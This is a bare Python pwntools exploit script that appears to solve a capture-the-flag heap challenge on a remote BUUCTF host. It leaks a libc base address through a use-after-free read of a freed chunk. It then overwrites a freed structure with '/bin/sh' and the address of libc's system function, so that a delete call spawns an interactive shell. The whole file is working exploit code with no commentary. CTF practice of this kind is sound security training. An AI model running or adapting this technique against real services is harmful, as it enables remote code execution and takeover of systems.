from pwn import *
#p=process('./1')
p=remote('node3.buuoj.cn',27995)
libc=ELF('libc-2.23_64.so')
#context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
def add(name,leng,des):
    sleep(0.1)
    p.sendline('1')
    sleep(0.1)
    p.sendline(str(name))
    sleep(0.1)
    p.sendline(str(leng))
    sleep(0.1)
    p.sendline(str(des))
def list():
    sleep(0.1)
    p.sendline('2')
def show(index):
    sleep(0.1)
    p.sendline('3')
    sleep(0.1)
    p.sendline(str(index))
def delete(index):
    sleep(0.1)
    p.sendline('4')
    sleep(0.1)
    p.sendline(str(index))
def debug():
    gdb.attach(p)
    pause()
    
add('aaaa',0x100,'')
add('cccc',0x100,'')
delete(0)
show(0)
p.recvuntil('Description:')
s=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
libc.address=s-88-0x3c4b20
print hex(libc.address)
#binsh=libc.search('/bin/sh').next()
delete(1)
add('/bin/sh\x00EEEEEEEE'+p64(libc.sym['system']),24,'')
delete(0)
p.interactive()
